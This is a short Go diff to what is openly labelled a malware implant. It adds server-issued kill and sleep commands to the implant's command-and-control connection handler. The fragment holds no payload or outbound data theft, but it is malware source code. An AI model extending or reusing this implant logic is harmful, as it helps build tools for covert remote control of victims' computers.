@@ -12,6 +12,7 @@ import (
 	pb "malware/common/messages"
 	"malware/common/types"
 	"malware/implant/included_modules"
+	"os"
 	"time"
 )
 
@@ -40,6 +41,15 @@ func (settings settings) doConnection() {
 
 	if reply.GetHeartbeat() != 0 {
 		return // Its a heartbeat so don't do anything
+	}
+
+	if reply.GetKill() != 0 {
+		os.Exit(0)
+	}
+
+	if reply.GetSleep() != 0 {
+		time.Sleep(time.Duration(reply.GetSleep()) * time.Second)
+		return
 	}
 
 	callback := func(reply *messages.ImplantReply) {
